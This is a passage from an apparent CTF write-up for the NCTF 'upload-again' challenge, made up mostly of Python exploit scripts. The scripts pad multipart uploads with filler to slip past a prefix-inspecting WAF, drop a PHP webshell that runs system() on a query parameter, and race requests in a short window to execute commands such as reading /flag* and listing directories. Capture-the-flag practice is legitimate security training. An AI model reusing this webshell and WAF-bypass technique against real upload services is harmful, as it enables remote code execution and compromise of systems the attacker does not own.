    except Exception as e: print("[upload] ERR",e)
def w():
    s=requests.Session()
    while not stop:
        try:
            r=s.get(URL+name,timeout=5)
            if "FLAG>>" in r.text: hits.add(r.text.split("FLAG>>")[1].split("<<")[0])
        except Exception: pass
ts=[threading.Thread(target=w) for _ in range(10)]
[t.start() for t in ts]; time.sleep(0.05); up(); time.sleep(1.2); stop=True; [t.join() for t in ts]
print("[+] FLAG:", hits)

~~~

### EXP 源码 02

**文件**：[exp/exploit.py](exp/exploit.py)

~~~python
#!/usr/bin/env python3
"""
NCTF upload-again exploit
- The app moves the upload to "/" (the web document root), sleeps ~300ms ("scan"), then deletes it.
- A body-prefix WAF resets the connection when the first ~2KB of the multipart body contains
  a ".php" filename or a "<?php\s" tag. Padding the multipart body with >2KB of filler before
  the file part bypasses the inspection.
- During the ~300ms window the file is live at "/<name>.php" and executed by the PHP built-in server,
  so we race GET requests to our uploaded webshell.
"""
import requests, threading, time, uuid, sys

URL = "http://noctf.fa1lsnow.com:40074/"
B = "----X"
name = "sh" + uuid.uuid4().hex[:8] + ".php"
shell = b"<?php echo 'PWN:'; system($_GET['c']); ?>"
pad = b"A" * 4000   # push the dangerous file part beyond the inspected prefix
body = (b"--" + B.encode() + b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n" + pad + b"\r\n"
        + b"--" + B.encode() + b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + name.encode()
        + b"\"\r\nContent-Type: text/plain\r\n\r\n" + shell + b"\r\n--" + B.encode() + b"--\r\n")
ct = "multipart/form-data; boundary=" + B

hits = []
stop = False

def upload():
    try:
        r = requests.post(URL, data=body, headers={"Content-Type": ct}, timeout=20)
        print("[upload]", r.status_code, r.text.split("</form>")[-1].strip())
    except Exception as e:
        print("[upload] ERR", type(e).__name__)

def worker(i):
    s = requests.Session()
    url = URL + name + "?c=cat%20/flag*%202>/dev/null"
    while not stop:
        try:
            r = s.get(url, timeout=5)
            if r.status_code == 200 and r.text.strip():
                hits.append(r.text.strip())
                print("[GET %d] %r" % (i, r.text.strip()[:200]))
        except Exception:
            pass

ths = [threading.Thread(target=worker, args=(i,)) for i in range(10)]
for t in ths: t.start()
time.sleep(0.05)
upload()
time.sleep(1.2)
stop = True
for t in ths: t.join()
print("[+] unique results:", set(hits))

~~~

### EXP 源码 03

**文件**：[exp/exploit_ls.py](exp/exploit_ls.py)

~~~python
#!/usr/bin/env python3
"""
NCTF upload-again exploit
- The app moves the upload to "/" (the web document root), sleeps ~300ms ("scan"), then deletes it.
- A body-prefix WAF resets the connection when the first ~2KB of the multipart body contains
  a ".php" filename or a "<?php\s" tag. Padding the multipart body with >2KB of filler before
  the file part bypasses the inspection.
- During the ~300ms window the file is live at "/<name>.php" and executed by the PHP built-in server,
  so we race GET requests to our uploaded webshell.
"""
import requests, threading, time, uuid, sys

URL = "http://noctf.fa1lsnow.com:40074/"
B = "----X"
name = "sh" + uuid.uuid4().hex[:8] + ".php"
shell = b"<?php echo 'PWN:'; system($_GET['c']); ?>"
pad = b"A" * 4000   # push the dangerous file part beyond the inspected prefix
body = (b"--" + B.encode() + b"\r\nContent-Disposition: form-data; name=\"pad\"\r\n\r\n" + pad + b"\r\n"
        + b"--" + B.encode() + b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + name.encode()
        + b"\"\r\nContent-Type: text/plain\r\n\r\n" + shell + b"\r\n--" + B.encode() + b"--\r\n")
ct = "multipart/form-data; boundary=" + B

hits = []
stop = False

def upload():
    try:
        r = requests.post(URL, data=body, headers={"Content-Type": ct}, timeout=20)
        print("[upload]", r.status_code, r.text.split("</form>")[-1].strip())
    except Exception as e:
        print("[upload] ERR", type(e).__name__)

def worker(i):
    s = requests.Session()
    url = URL + name + "?c=ls%20-la%20/%20;%20id;%20ls%20/flag*"
    while not stop:
        try:
            r = s.get(url, timeout=5)
            if r.status_code == 200 and r.text.strip():
                hits.append(r.text.strip())
                print("[GET %d] %r" % (i, r.text.strip()[:200]))
        except Exception:
            pass

ths = [threading.Thread(target=worker, args=(i,)) for i in range(10)]
for t in ths: t.start()
time.sleep(0.05)
upload()
time.sleep(1.2)
stop = True
for t in ths: t.join()
print("[+] unique results:", set(hits))

~~~

---

[返回顶部](#upload-again-题解)
